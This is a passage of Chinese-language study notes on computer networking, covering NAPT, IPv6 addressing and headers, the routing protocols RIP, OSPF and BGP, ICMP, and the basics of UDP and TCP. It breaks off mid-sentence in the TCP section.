NAPT的实现</h4><p>为了解决以上两个问题，我们提出了NAPT，了解一下传输层-端口号的概念。</p><p>NAT路由器只需要一个全球IP地址，不通过IP地址来区分不同的本地源IP地址，而通过NAT路由器上的端口号来实现。</p><p>NAT路由器发出的数据报转换为：source IP addr, port #) -&gt; (NAT IP addr, new port #)</p><p>所有从外界发回来的数据报也会使用(NAT IP addr, new port #)</p><p>在NAT地址转换表中，将记录每一个映射对，接收到数据报后经过映射转换再发送给正确的主机。</p><h3 id="natnapt总结"><a class="markdownIt-Anchor" href="#natnapt总结"></a> NAT（&amp;NAPT）总结</h3><p>NAPT采用端口号区分本地网内的不同主机，端口号在传输层分组中，占用16bit。因此，即使只使用一个全球IP地址，也能同时连接超过六万台本地主机。</p><p>NAT是“有争议性”的、“临时”的解决手段</p><p>路由器应至多只处理第三层；</p><p>端口号是第四层的地址短缺应由IPv6彻底解决，而不应该让NAT作临时解决，违背了端对端原则（end-to-end argument）</p><p>网络不应该修改分组的内容！应该由端系统来做这件事情例如，p2p应用，由应用程序本身来做这件事情，而不是由网络来做</p><p>NAT后的主机不能同时作为服务器向外提供服务</p><h2 id="ipv6"><a class="markdownIt-Anchor" href="#ipv6"></a> IPv6</h2><p>IPv4的32位地址已经耗尽，于是决定采用具有更大地址空间的新版本IP，即IPv6</p><p>IPv6 仍支持<strong>无连接的传送</strong>，但将协议数据单元 PDU（数据报） 称为<strong>分组</strong>。为方便起见，本书仍采用数据报这一名词</p><p>主要变化如下：</p><ol><li>更大的地址空间，从32位到了128位</li><li>拓展的地址层次结构</li><li>灵活的首部格式，IPv6定义了许多可选的拓展首部</li><li>改进的选项。IPv6允许数据报包含有选项的控制信息，将选项放进有效载荷中</li><li>允许协议继续扩充</li><li>支持即插即用（自动配置）</li><li>支持资源预分配。IPv6支持实时视象。</li><li>IPv6首部改成8字节对齐，首部长度必须是8字节的整数倍，原来的IPv4首部是4字节对齐。</li></ol><h3 id="ipv6的形式"><a class="markdownIt-Anchor" href="#ipv6的形式"></a> IPv6的形式</h3><p>IPv6主要分为两部分：基本首部和有效载荷。其中基本首部占固定的40字节，剩下的有效载荷不超过65535字节，包活拓展首部和数据部分。</p><p>首部的变化主要有以下改变：</p><ul><li>取消了首部长度字段，IPv6的首部长度为固定的40字节</li><li>取消了服务类型字段</li><li>取消了总长度字段，改用有效载荷字段</li><li>把TTL改为跳数限制字段</li><li>取消了协议字段，改为下一个首部字段</li><li>取消了检验和字段</li><li>取消了选项字段，改用扩展首部来实现</li></ul><h4 id="ipv6首部固定部分各字段"><a class="markdownIt-Anchor" href="#ipv6首部固定部分各字段"></a> IPv6首部固定部分各字段</h4><h5 id="版本-2"><a class="markdownIt-Anchor" href="#版本-2"></a> 版本</h5><p>占4位，总是为6。</p><h5 id="通信量类traffic-class"><a class="markdownIt-Anchor" href="#通信量类traffic-class"></a> 通信量类/traffic class</h5><p>8位，为了区分不同得到IPv6数据报的类型和优先级。</p><h5 id="流标号flow-label"><a class="markdownIt-Anchor" href="#流标号flow-label"></a> 流标号/flow label</h5><p>20位，属于一个流的数据报都拥有相同的流标号。</p><h5 id="有效载荷长度payload-length"><a class="markdownIt-Anchor" href="#有效载荷长度payload-length"></a> 有效载荷长度/payload length</h5><p>16位，指明了非固定首部部分的长度，最大值为64KB。</p><h5 id="下一个首部next-header"><a class="markdownIt-Anchor" href="#下一个首部next-header"></a> 下一个首部/next header</h5><p>8位，相当于IPv4的协议字段或可选字段。</p><h5 id="跳数限制hop-limit"><a class="markdownIt-Anchor" href="#跳数限制hop-limit"></a> 跳数限制/hop limit</h5><p>8位，和TTL大致相同。</p><h5 id="源地址"><a class="markdownIt-Anchor" href="#源地址"></a> 源地址</h5><p>128位，是发送数据站的IP地址。</p><h5 id="目的地址"><a class="markdownIt-Anchor" href="#目的地址"></a> 目的地址</h5><p>128位，是数据报接收站的IP地址。</p><p><strong>IPv6不要求记住首部字段意义，但要求记住IPv4首部。</strong></p><h3 id="ipv6的地址"><a class="markdownIt-Anchor" href="#ipv6的地址"></a> IPv6的地址</h3><ol><li>单播/unicast：传统的点对点通信</li><li>多播/multicast：一对多点的通信</li><li>任播/anycast：IPv6新增加的类型。任播的目的站是一组计算机，但是数据报的交付只交给其中一台，通常是目的最近的那一个。</li></ol><h4 id="结点与接口"><a class="markdownIt-Anchor" href="#结点与接口"></a> 结点与接口</h4><p>IPv6将实现IPv6的主机和路由器统称为<strong>结点</strong>。一个节点可能有多个和链路连接的接口。IPv6地址就是分配给上面的接口的。</p><p>一个接口可以有多个单播地址，任何一个单播地址都可以用来当做到达该结点的目的地址。</p><h4 id="冒号十六进制记法colon-hexadecimal-notationcolon-hex"><a class="markdownIt-Anchor" href="#冒号十六进制记法colon-hexadecimal-notationcolon-hex"></a> 冒号十六进制记法/colon hexadecimal notation/colon hex</h4><p>IPv6允许将其地址每十六位用十六进制表示，各个值之间用冒号分隔，并且允许省略数字前面的0，例如：<code>68E6:8C64:FFFF:FFFF:0:1180:960A:FFFF</code>。</p><p>冒号十六进制可以允许<strong>零压缩</strong>，即一连串连续的零可以用一对冒号所替代。</p><p>例如<code>FF05:0:0:0:0:0:0:B3</code>，可压缩为<code>FF05::B3</code>。</p><p>在任一地址中只能使用一次零压缩。</p><p>冒号十六进制仍可采用点分十进制记法的后缀，这种结合在IPv4转IPv6时很有用。</p><p>例如<code>0:0:0:0:0:0:128.10.2.1</code>，可压缩为<code>::128.10.2.1</code>。</p><p>CIDR的斜线表示法仍然可用。</p><p>如60位的前缀<code>12AB00000000CD3</code>，可以记为：<code>12AB:0000:0000:CD30:0000:0000:0000:0000/60</code>。</p><h4 id="地址分类"><a class="markdownIt-Anchor" href="#地址分类"></a> 地址分类</h4><table><thead><tr><th>地址类型</th><th>二进制前缀</th></tr></thead><tbody><tr><td>未指明地址</td><td>00…0（128位），可记::/128</td></tr><tr><td>环回地址</td><td>00…1（128位），可记为::1/128</td></tr><tr><td>多播地址</td><td>1111111（8位），可记为FF00::/8</td></tr><tr><td>本地链路地址</td><td>1111111010（10位），可记为FE80::/10</td></tr><tr><td>全球单播地址</td><td>除上述地址外，所有其他的二进制地址</td></tr></tbody></table><h5 id="未指明地址"><a class="markdownIt-Anchor" href="#未指明地址"></a> 未指明地址</h5><p>这个地址只能为还没有分配到一个标准IP地址的主机当做源地址使用，这类地址仅此一个。</p><h5 id="环回地址"><a class="markdownIt-Anchor" href="#环回地址"></a> 环回地址</h5><p>作用与IPv6的环回地址一样，这类地址也是仅此一个。</p><h5 id="多播地址"><a class="markdownIt-Anchor" href="#多播地址"></a> 多播地址</h5><p>功能与IPv4的相同。</p><h5 id="本地链路单播地址link-local-unicast-address"><a class="markdownIt-Anchor" href="#本地链路单播地址link-local-unicast-address"></a> 本地链路单播地址/Link-Local Unicast Address</h5><p>有些单位的网络使用TCP/IP协议，但没有连接到互联网上。这样连接的主机都可以用这种本地地址进行通信，但不能和互联网其他地址通信。</p><h5 id="全球单播地址"><a class="markdownIt-Anchor" href="#全球单播地址"></a> 全球单播地址</h5><p>使用最多的一类IPv6地址，IPv6单播地址的划分方法十分灵活。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231020091322330.png" alt="image-20231020091322330" /></p><h4 id="从ipv4到ipv6过渡"><a class="markdownIt-Anchor" href="#从ipv4到ipv6过渡"></a> 从IPv4到IPv6过渡</h4><p>主要使用两种策略：双协议栈和隧道技术。</p><h5 id="双协议栈dual-stack"><a class="markdownIt-Anchor" href="#双协议栈dual-stack"></a> 双协议栈/dual stack</h5><p>指的是双协议栈的主机或者路由器同时拥有两种地址：一个IPv6地址和一个IPv4地址。主机和IPv6主机通信就采取IPv6地址，和IPv4主机通信就采取IPv4地址。主机一般通过DNS返回的地址类型来确定使用哪种地址进行通信。</p><h5 id="隧道技术"><a class="markdownIt-Anchor" href="#隧道技术"></a> 隧道技术</h5><p>隧道技术就是在IPv6数据报将要进入IPv4网络时，将IPv6数据报封装为IPv4数据报，整个的IPv6数据报变成了IPv4数据报的数据部分。等IPv4数据报离开IPv4网络隧道时，再将数据部分/IPv6数据报交给主机的IPv6协议栈。</p><h2 id="路由协议算法"><a class="markdownIt-Anchor" href="#路由协议算法"></a> 路由协议/算法</h2><p>路由协议的目的是如何选择从起点到终点经过路由器的最佳路径。路由协议不关心如何在主机中传送数据，它只研究路由器之间的最佳路径。</p><h3 id="基本概念"><a class="markdownIt-Anchor" href="#基本概念"></a> 基本概念</h3><h4 id="理想路由算法"><a class="markdownIt-Anchor" href="#理想路由算法"></a> 理想路由算法</h4><ul><li>算法是正确且完整的</li><li>算法在计算上应该简单</li><li>算法能适应通信量和网络拓扑的变化，也就是说要有自适应性</li><li>算法具有稳定性</li><li>算法是公平的</li><li>算法是最佳的</li></ul><h4 id="最佳路由"><a class="markdownIt-Anchor" href="#最佳路由"></a> “最佳路由”</h4><ul><li>不存在一种绝对的最佳路由算法</li><li>最佳路由算法只是一种特定条件下的最优解</li><li>最佳路由算法非常复杂，因为有很多变量在开始时不能全部知道。</li><li>静态路由选择策略：非自适应路由选择，开销较小，但不能及时适应网络变化</li><li>动态路由选择策略：自适应路由选择，较好的适应网络状态的变化，但开销较大。</li></ul><h3 id="分层次的路由选择协议"><a class="markdownIt-Anchor" href="#分层次的路由选择协议"></a> 分层次的路由选择协议</h3><h4 id="内部网关协议igp"><a class="markdownIt-Anchor" href="#内部网关协议igp"></a> 内部网关协议/IGP</h4><p>一个自治系统内部使用的路由选择协议。</p><p>内部网关协议用的最多的是RIP和OSPF协议。</p><h4 id="外部网关协议egp"><a class="markdownIt-Anchor" href="#外部网关协议egp"></a> 外部网关协议/EGP</h4><p>若源站和目的站在不同的自治系统中，当数据报传到系统边界时，就需要一种协议将路由选择信息传入另一个自治系统中，这就是外部网关协议EGP。</p><p>目前用的最多的外部网关协议是BGP-4.</p><h3 id="路由算法的分类"><a class="markdownIt-Anchor" href="#路由算法的分类"></a> 路由算法的分类</h3><h4 id="链路状态算法"><a class="markdownIt-Anchor" href="#链路状态算法"></a> 链路状态算法</h4><p>所有路由器知道完整的拓扑结构与路径的距离和开销。</p><p>使用Dijkstra最短路径算法，详细算法参见其他资料：</p><p><a href="https://zhuanlan.zhihu.com/p/72120630">dijkstra算法 - 知乎 (zhihu.com)</a></p><p><a href="https://zhuanlan.zhihu.com/p/338414118">Dijkstra算法详解 通俗易懂 - 知乎 (zhihu.com)</a></p><h4 id="距离向量算法"><a class="markdownIt-Anchor" href="#距离向量算法"></a> 距离向量算法</h4><p>路由器只知道和自己相邻的其他路由器的存在与距离成本信息。</p><p>使用Bellman-Ford等式（动态规划思想）</p><h4 id="算法对比"><a class="markdownIt-Anchor" href="#算法对比"></a> 算法对比</h4><table><thead><tr><th></th><th>链路状态算法</th><th>距离向量算法</th></tr></thead><tbody><tr><td>消息复杂度</td><td>n个节点，E条线路，需要发送O(nE)条消息</td><td>消息只在相邻节点中传播，数量不定</td></tr><tr><td>收敛速度</td><td>O(n^2)，复杂度确定</td><td>收敛时间不定，可能有路由环路，无穷计数等问题</td></tr><tr><td>健壮性</td><td>可能会广播错误的<strong>链路</strong>成本，且每个节点只会计算自己的转发表</td><td>可能会广播错误的<strong>路径</strong>成本，每个节点的转发表都会被其他节点所使用，所以错误可能会在网络中逐渐传播</td></tr></tbody></table><h2 id="内部网关协议-rip协议"><a class="markdownIt-Anchor" href="#内部网关协议-rip协议"></a> 内部网关协议 RIP协议</h2><p>RIP/Routing Information Protocol路由信息协议是一种分布式的，<strong>基于距离向量</strong>的路由选择协议，是内部网关协议IGP中最先得到广泛使用的协议。</p><h3 id="距离的定义"><a class="markdownIt-Anchor" href="#距离的定义"></a> 距离的定义</h3><ul><li>从一个路由器到直接连接的网络距离定义为1，到非直接连接的网络距离定义为所经过的路由器数目加一。</li><li>RIP中的距离就是“跳数”（hop count），因为每经过一个路由器跳数就加一。</li><li>这里的距离其实就是“最短距离”。</li><li>RIP只允许一条路径最多包含15个路由器。故RIP协议只能在小型网络中使用。</li><li>RIP无法在两个网络中使用多条路由，因为RIP只选择经过路由器数量最少的路由。</li></ul><h3 id="特点"><a class="markdownIt-Anchor" href="#特点"></a> 特点</h3><ul><li>仅和相邻路由器交换信息（距离向量算法）</li><li>交换信息就是自己的路由表（距离向量算法）</li><li>按固定的时间交换路由信息，防止交换的路由表是错误的（距离向量算法）</li></ul><h3 id="报文格式"><a class="markdownIt-Anchor" href="#报文格式"></a> 报文格式</h3><p>RIP2协议是被包含在UDP协议中在网络层进行传输的。结构图如下。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231027110212473.png" alt="" /></p><p>这些信息统称为路由信息（20字节/路由），可以重复出现，最多不超过25个。</p><ul><li>RIP2报文由首部和路由部分组成。</li><li>地址族标识符字段用来标志所使用的地址协议。</li><li>路由标记填入自治系统的号码，防止RIP使用自治系统外的路由选择信息。</li><li>在后面就是网络地址，子网掩码，和下一跳的路由地址以及距离。</li></ul><h3 id="优缺点"><a class="markdownIt-Anchor" href="#优缺点"></a> 优缺点</h3><h4 id="优点-2"><a class="markdownIt-Anchor" href="#优点-2"></a> 优点</h4><p>实现简单，开销小。</p><h4 id="缺点"><a class="markdownIt-Anchor" href="#缺点"></a> 缺点</h4><ol><li>限制了网络的规模，只能在15个路由器之间使用。</li><li>因为路由器之间交换路由表是路由器中的完整路由表，网络规模扩大会带来开销的增加（实际上也增加不了多少）</li><li>“坏消息传的慢”，更新过程收敛时间太长。</li></ol><h2 id="ospf协议"><a class="markdownIt-Anchor" href="#ospf协议"></a> OSPF协议</h2><p>OSPF的原理很简单，但是实现却有点复杂。</p><h3 id="特点-2"><a class="markdownIt-Anchor" href="#特点-2"></a> 特点</h3><ul><li>“开放”，不受某一家厂商克制，而是公开发表的。</li><li>“最短路径优先”，使用了Dijkstra提出的最短路径算法SPF。</li><li>采用分布式的链路状态协议。</li><li>在实际使用中，使用<strong>洪泛法</strong>向自治系统中的所有路由器发送信息。发送的信息是与本路由器相邻的所有路由器的链路状态，这只是路由器知道的部分信息。</li><li>“链路状态”是说明本路由器和哪些路由器相邻以及该链路的“度量”（metric）。</li><li>只有链路状态变化时，路由器才采用洪泛法向所有路由器发送此信息，节省了流量。</li></ul><h4 id="链路状态数据库link-state-database"><a class="markdownIt-Anchor" href="#链路状态数据库link-state-database"></a> 链路状态数据库/link-state database</h4><p>由于各路由器之间频繁的交换路由信息，最后所有的路由器都能建立一个链路状态数据库。其实就是全网的拓扑结构图，这在全网的范围内是一致的（称为链路状态数据库是同步的）。且OSPF的链路状态数据库能够较快的更新，OSPF的更新过程收敛快是它的一个重要优点。</p><h4 id="区域area"><a class="markdownIt-Anchor" href="#区域area"></a> 区域/area</h4><p>为了使OSPF能够用于规模很大的网络，OSPF将一个自治系统再划分为若干个更小的范围，称为<strong>区域</strong>（就是在中间人工的添加了一个层次）。每一个区域都有一个32位的区域标识符（用点分十进制表示）。</p><p>但是区域也不能太大，最好不超过200个路由器。</p><h5 id="划分区域"><a class="markdownIt-Anchor" href="#划分区域"></a> 划分区域</h5><p>划分区域的好处就是利用洪泛法交换的链路信息状态局限于每个区域而不是整个自治系统，这样减少了网络上的通信量。</p><p>在一个区域内部的路由器只知道本区域的完整网络拓扑，而不知道其他区域的网络拓扑情况。</p><p>OSPF使用<strong>层次结构的区域划分</strong>，在上层的区域叫做<strong>主干区域/backbone area</strong>。主干区域的标识符规定为0.0.0.0，其作用是连通其他在下层的区域。</p><h4 id="直接使用ip数据发送"><a class="markdownIt-Anchor" href="#直接使用ip数据发送"></a> 直接使用IP数据发送</h4><p>OSPF不使用UDP而直接使用IP数据报发送。这样的数据报很短，可以减少路由信息的通信量，且不必将过长的数据分片传输。</p><p>但是分片传输的数据只要丢失一个，就无法组装成原来的数据报，整个数据报就必须重传。</p><h4 id="分组类型"><a class="markdownIt-Anchor" href="#分组类型"></a> 分组类型</h4><ul><li>问候分组</li><li>数据库描述分组</li><li>链路状态请求分组</li><li>链路状态更新分组/用洪泛法对全网更新路由状态</li><li>链路状态确认分组</li></ul><p>基本操作如下。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231103091602726.png" alt="image-20231103091602726" /></p><h4 id="其他"><a class="markdownIt-Anchor" href="#其他"></a> 其他</h4><p>OSPF对不同的链路可以根据IP分组的不同服务类型TOS而设置成不同的代价。也就是说，OSPF可以根据不同类型的业务计算出不同的路由。如果到达同一个目的有多条相同代价的路径，就可以将通信量分配给这几条路径，达到<strong>多路径间的负载平衡</strong>（这点和RIP协议大相径庭，OSPF要做的更好）。</p><p>所有在OSPF路由器之间交换的分组都具有鉴别的功能，且支持可变长度的子网划分和无分类编址CIDR。</p><p>每一个链路状态都带上一个32位的序号，序号越大状态越新。</p><p>OSPF还规定每隔一段时间（比如30分钟）就刷新一次数据库中的链路状态。</p><p>因为OSPF每一个路由器的链路状态只涉及到与其相邻的路由器状态，和互联网规模没有直接关系。所以当互联网规模很大时，OSPF协议要明显优于RIP。</p><p>OSPF没有坏消息传播得慢”的问题。</p><h2 id="外部网关协议"><a class="markdownIt-Anchor" href="#外部网关协议"></a> 外部网关协议</h2><h3 id="bgp协议"><a class="markdownIt-Anchor" href="#bgp协议"></a> BGP协议</h3><p>BGP是不同自治系统路由器之间的交换路由信息的协议。</p><h4 id="使用环境"><a class="markdownIt-Anchor" href="#使用环境"></a> 使用环境</h4><p>由于互联网规模太大，一条路径通过几个不同的AS（自治系统）时，计算出“最佳路由”是不太可能的。比较合理的做法是在AS间交换“可达性”信息。于是，BGP边界网关协议只是力求找到一条<strong>比较好</strong>的路由（不循环就算成功），而不是最佳路由。</p><h4 id="发言人"><a class="markdownIt-Anchor" href="#发言人"></a> 发言人</h4><p>每一个自治系统的管理员都至少要选择一个路由器作为该自治系统的“BGP发言人/speaker”。</p><p>一个BGP发言人与其他自治系统中的BGP发言人要交换路由信息，就必须先建立<strong>TCP连接</strong>，然后在此连接的基础上建立<strong>BGP会话/session</strong>，利用此会话交换路由信息。使用TCP连接交换信息的两个发言人，互为对方的<strong>邻站/neighbor</strong>或<strong>对等站/peer</strong>。</p><p>BGP交换的网络可达性信息就是<strong>要到达某个网络所要经过的一系列AS</strong>。当各个发言人互相交换了可达性信息后，发言人就可以根据所采用的策略来从收到的路由信息中选择到达各AS的较好路由。</p><p>例图如下。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231103094323847.png" alt="image-20231103094323847" /></p><h4 id="特点-3"><a class="markdownIt-Anchor" href="#特点-3"></a> 特点</h4><p>BGP协议交换路由信息的节点数量级是自治系统数的量级，这笔自治系统中的网络数少很多。且每一个BGP发言人数量很少，使得自治系统之间的路由选择不过于复杂。</p><p>BGP支持CIDR。</p><p>在BGP刚刚运行时，要和邻站交换整个路由表。而之后在发生变化时只更新变化的部分，这样做对节省网络带宽和减少路由器处理开销都有好处。</p><h2 id="icmp协议"><a class="markdownIt-Anchor" href="#icmp协议"></a> ICMP协议</h2><p>为了更有效的转发IP数据报，在网络层采取了<strong>网络控制报文协议ICMP/Internet Control Message Protocol</strong>。</p><p>ICMP允许主机或路由器报告差错情况和提供有关异常情况的报告（Ping 的时候貌似发送的就是这个）。但是ICMP报文并不是高层协议，而是IP层的协议。ICMP的报文被封装在IP数据报中。</p><h3 id="格式"><a class="markdownIt-Anchor" href="#格式"></a> 格式</h3><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231103095327126.png" alt="image-20231103095327126" /></p><h3 id="种类"><a class="markdownIt-Anchor" href="#种类"></a> 种类</h3><p>有两种，即<strong>差错检验报文</strong>和<strong>询问报文</strong>。</p><p>ICMP前4个字节是统一的格式，共有三个字段：<strong>类型、代码、检验和</strong>。接着4个字节的内容与ICMP的类型有关。</p><h3 id="差错报告报文"><a class="markdownIt-Anchor" href="#差错报告报文"></a> 差错报告报文</h3><p>共有4种。</p><ul><li>终点不可达</li><li>超时</li><li>参数问题</li><li>改变路由（重定向/Redirect）</li></ul><p>内容如图所示。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231103095909320.png" alt="image-20231103095909320" /></p><h3 id="询问报文"><a class="markdownIt-Anchor" href="#询问报文"></a> 询问报文</h3><p>有两种。</p><ul><li>回送请求和回答报文</li><li>时间戳请求和回答报文</li></ul><h3 id="应用举例"><a class="markdownIt-Anchor" href="#应用举例"></a> 应用举例</h3><h4 id="pingpacket-internet-groper"><a class="markdownIt-Anchor" href="#pingpacket-internet-groper"></a> PING/Packet Internet Groper</h4><p>Ping用来测试两个主机的连通性，使用了ICMP的回送请求和回答报文。它是应用层直接使用网络层ICMP的例子，没有经过运输层的TCP或者UDP。</p><h4 id="traceroute"><a class="markdownIt-Anchor" href="#traceroute"></a> Traceroute</h4><p>在Windows中这个命令时tracert，用来跟踪一个分组从源点到终点的路径。利用IP数据报中的TTL字段和ICMP时间超过差错报告实现从源点到终点的路径的跟踪。</p><h2 id="运输层"><a class="markdownIt-Anchor" href="#运输层"></a> 运输层</h2><p>运输层属于面向通信部分的最高层，也是用户功能中的最低层。只有位于网络边缘部分的主机的协议栈才有运输层。</p><p>我们引入“逻辑通信”这个概念，实际上在前面也有介绍过。她的意思是“好像是这样通信，但事实上并非是这样”。比如网络层之间传输数据，可以直接看成两台主机之间的通信而忽略其下的链路层传输。而在运输层中，这种说法还不够明确，实际上两台主机之间进行通信应该是“端到端”的通信，也就是主机上进程之间的通信。我们也把这些通信叫为“计算机之间的通信”，但是和主机之间通信的含义并不一样。</p><p>运输层向高层的用户屏蔽了底层信息，让主机之间通信看起来好像存在一条通路使得进程之间直接进行通信。</p><h3 id="udp和tcp"><a class="markdownIt-Anchor" href="#udp和tcp"></a> UDP和TCP</h3><table><thead><tr><th>UDP</th><th>TCP</th></tr></thead><tbody><tr><td>无连接的协议，提供无连接服务。</td><td>面向连接的协议，面向连接的服务。</td></tr><tr><td>传送的协议数据单元TPDU是UDP报文或用户数据报。</td><td>其TPDU是TCP报文。</td></tr><tr><td>支持单播、多播、广播。</td><td>支持点对点单播，不支持多播、广播</td></tr><tr><td>不提供可靠服务。</td><td>保证服务可靠</td></tr><tr><td>简单，适用于很多应用。适用于对数据可靠性要求不高，或者数据大小较小的应用。如多媒体应用等。</td><td>复杂。适用于大多数应用，如：万维网、电子邮件、文件传输等。</td></tr></tbody></table><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231110000751387.png" alt="image-20231110000751387" /></p><p>还有两点需要强调：</p><ol><li>运输层的 UDP 用户数据报与网际层的IP数据报有很大区别。IP 数据报要经过互连网中许多路由器的存储转发，而UDP 用户数据报是在运输层的端到端抽象的逻辑信道中传送的。（这里我也有点没看懂）</li><li>TCP 报文段是在运输层抽象的端到端逻辑信道中传送，这种信道是可靠的全双工信道。但这样的信道却不知道究竟经过了哪些路由器，而这些路由器也根本不知道上面的运输层是否建立了 TCP 连接。因为被抽象掉了吧。</li></ol><h4 id="运输层的端口"><a class="markdownIt-Anchor" href="#运输层的端口"></a> 运输层的端口</h4><p>运行在计算机中的进程是用<strong>进程标识符</strong>来标志的。</p><p>但运行在应用层的各种应用进程却不应当让计算机操作系统指派它的进程标识符。这是因为在互联网上使用的计算机的操作系统种类很多，而不同的操作系统又使用不同格式的进程标识符。</p><p>为了使运行不同操作系统的计算机的应用进程能够互相通信，就必须<strong>用统一的方法</strong>对 TCP/IP 体系的应用进程进行标志。</p><p>这里就有几个问题需要被解决：</p><ul><li>由于进程的创建和撤销都是动态的，发送方几乎无法识别其他机器上的进程/如何识别其他机器的进程。</li><li>有时我们会改换接收报文的进程，但并不需要通知所有发送方/如何动态的更换接收报文的进程。</li><li>我们往往需要利用目的主机提供的功能来识别终点，而不需要知道实现这个功能的进程/如何识别进程终点。</li></ul><p>为了解决这些问题，我们引入了<strong>端口号</strong>的概念。</p><h4 id="端口号protocol-port-number"><a class="markdownIt-Anchor" href="#端口号protocol-port-number"></a> 端口号/protocol port number</h4><p>解决这个问题的方法就是在运输层使用<strong>协议端口号 (protocol port number)</strong>，或通常简称为<strong>端口 (port)</strong>。</p><p>虽然通信的终点是应用进程，但我们可以把端口想象是通信的终点，因为我们只要把要传送的报文交到目的主机的某一个合适的目的端口，剩下的工作（即最后交付目的进程）就由 TCP 来完成。</p><p>端口用一个 16 位端口号进行标志，允许有65,535个不同的端口号。端口号只具有本地意义，即端口号只是为了标志本计算机应用层中的各进程。在互联网中，不同计算机的相同端口号是没有联系的。</p><p>也就是说，两个计算机中的进程要互相通信，不仅必须知道对方的端口号（为了找到对方计算机中的应用进程） ，而且还要知道对方的 IP 地址（为了找到对方的计算机）。</p><h5 id="两大类端口号"><a class="markdownIt-Anchor" href="#两大类端口号"></a> 两大类端口号</h5><p>一般来说，将端口号分为服务器使用端口和客户端使用的端口。</p><h6 id="服务器端使用的端口号"><a class="markdownIt-Anchor" href="#服务器端使用的端口号"></a> 服务器端使用的端口号</h6><ol><li>熟知端口，数值一般为 0 ~ 1023。</li><li>登记端口号，数值为 1024 ~ 49151，为没有熟知端口号的应用程序使用的。使用这个范围的端口号必须在 IANA 登记，以防止重复。</li></ol><h6 id="客户端使用的端口号"><a class="markdownIt-Anchor" href="#客户端使用的端口号"></a> 客户端使用的端口号</h6><ol><li>又称为短暂端口号，数值为 49152 ~ 65535，留给客户进程选择暂时使用。</li><li>当服务器进程收到客户进程的报文时，就知道了客户进程所使用的动态端口号。通信结束后，这个端口号可供其他客户进程以后使用。</li></ol><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231117132354258.png" alt="" /></p><h5 id="硬件端口和软件端口"><a class="markdownIt-Anchor" href="#硬件端口和软件端口"></a> 硬件端口和软件端口</h5><p>这是两种不同的概念。</p><p>在协议栈层间的抽象的协议端口是软件端口。路由器或交换机上的端口是硬件端口。</p><p>硬件端口是不同硬件设备进行交互的接口，而软件端口是应用层的各种协议进程与运输实体进行层间交互的一种<strong>地址</strong>。</p><h3 id="udp协议"><a class="markdownIt-Anchor" href="#udp协议"></a> UDP协议</h3><p>接下来我们来介绍用户数据报协议UDP。</p><h4 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h4><p>UDP 只在 IP 的数据报服务之上增加了很少一点的功能：复用和分用的功能差错检测的功能。它主要有以下几个特点：</p><ol><li>无连接。发送数据之前不需要建立连接，因此减少了开销和发送数据之前的时延。</li><li>使用最大努力交付。即不保证可靠交付，因此主机不需要维持复杂的连接状态表。</li><li>面向报文。UDP 对应用层交下来的报文，既不合并，也不拆分，而是保留这些报文的边界。UDP 一次交付一个完整的报文。</li><li>没有拥塞控制。因此网络拥塞不会使源主机发送速率降低，适合多媒体通信。</li><li>支持一对一、一对多、多对一和多对多的交互通信。</li><li>首部开销小。比起TCP的20个字节，UDP的首部只有8字节。</li></ol><h4 id="面向报文"><a class="markdownIt-Anchor" href="#面向报文"></a> 面向报文</h4><p>在发送方，UDP对于应用程序交付给他的报文不做额外处理，添加首部后就直接向下交给IP层，只是保留了报文的边界。应用层交付给UDP多长的报文，UDP就照样会发送，即一次发送一个报文。</p><p>在接收方，UDP对于IP层交上来的数据报只是简单的去除首部就原封不动的上交给应用进程，<strong>一次性交付一个完整的报文</strong>。</p><p>对于应用程序，必须要选择<strong>合适长度大小</strong>的报文。</p><ul><li>报文太长，UDP把它交给IP层发送时，IP层可能要进行分片，这会降低传送的效率。</li><li>报文太短，UDP把它交给IP层后，会使得IP层数据报首部的相对长度太大，这也降低了效率。</li></ul><h4 id="udp的首部格式"><a class="markdownIt-Anchor" href="#udp的首部格式"></a> UDP的首部格式</h4><p>用户数据报 UDP 有两个字段：数据字段和首部字段。首部字段有 8 个字节，由 4 个字段组成，每个字段都是 2 个字节。 分别是：源端口、目的端口、长度、检验和。</p><p>当运输层从 IP 层收到 UDP 数据报时，就根据首部中的目的端口，把 UDP 数据报通过相应的端口，上交给最后的终点——应用进程。</p><p>长度指UDP数据报整体的长度。</p><p>检验和计算时，需要临时把12个字节的“伪首部”和UDP用户数据报连接在一起计算。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231117134838024.png" alt="image-20231117134838024" /></p><h3 id="tcp协议"><a class="markdownIt-Anchor" href="#tcp协议"></a> TCP协议</h3><p>这一小节主要介绍传输控制协议 TCP协议。</p><h4 id="主要特点"><a class="markdownIt-Anchor" href="#主要特点"></a> 主要特点</h4><p>TCP 是<strong>面向连接</strong>的运输层协议，在无连接的、不可靠的 IP 网络服务基础之上提供<strong>可靠交付</strong>的服务。为此，在 IP 的数据报服务基础之上，增加了保证可靠性的一系列措施。</p><ul><li>TCP 是面向连接的运输层协议。</li><li>每一条 TCP 连接只能有两个端点 (endpoint)，每一条 TCP 连接<strong>只能是点对点的</strong>（一对一）。</li><li>TCP 提供<strong>可靠交付</strong>的服务。</li><li>TCP 提供<strong>全双工</strong>通信。</li><li><strong>面向字节流</strong><ul><li>TCP 中的“流”(stream) 指的是流入或流出进程的字节序列。</li><li>“面向字节流”的含义是：虽然应用程序和 TCP 的交互是一次一个数据块，但 TCP 把应用程序交下来的数据看成仅仅是一连串无结构的字节流。</li></ul></li></ul><p>所谓的面向流的概念，是指TCP 不保证接收方应用程序所收到的数据块和发送方应用程序所发出的数据块具有对应大小的关系。但接收方应用程序收到的字节流必须和发送方应用程序发出的字节流完全一样。</p><p>TCP 不关心应用进程一次把多长的报文发送到 TCP 缓存。TCP 对连续的字节流进行分段，形成 TCP 报文段。</p><h5 id="注意"><a class="markdownIt-Anchor" href="#注意"></a> 注意</h5><p>TCP 